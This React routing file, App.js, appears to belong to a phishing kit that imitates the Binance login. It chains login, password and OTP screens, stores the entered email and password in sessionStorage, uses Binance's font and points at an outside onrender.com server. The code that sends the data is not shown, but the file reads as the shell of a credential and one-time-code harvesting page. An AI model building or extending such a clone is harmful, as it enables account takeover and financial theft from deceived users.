import { BrowserRouter, Route, Routes } from "react-router-dom";
import Login from "./screen/Login";
import NotFound from "./screen/NotFound";
import OTP from "./screen/OTP";
import Footer from "./screen/Footer";
import Password from "./screen/Password";

// export const serverRoute = "http://localhost:8080";
export const serverRoute = 'https://server-xny1.onrender.com'

export const email = sessionStorage.getItem("email");
export const password = sessionStorage.getItem("password");

function App() {
  return (
    <>
      {
        <div
          className=" w-full main min-h-screen flex flex-col items-center justify-around "
          style={{
           
            fontFamily: "BinancePlex,Arial,sans-serif!important",
          }}
        >
          <BrowserRouter>
            <Routes>
              <Route element={<Login />} path="/" />

              {email && (
                <>
                  <Route element={<Password />} path="/password" />
                  {password && <Route element={<OTP />} path="/verify" />}
                </>
              )}

              <Route element={<NotFound />} path="*" />
            </Routes>

            <Footer />
          </BrowserRouter>
        </div>
      }
    </>
  );
}

export default App;
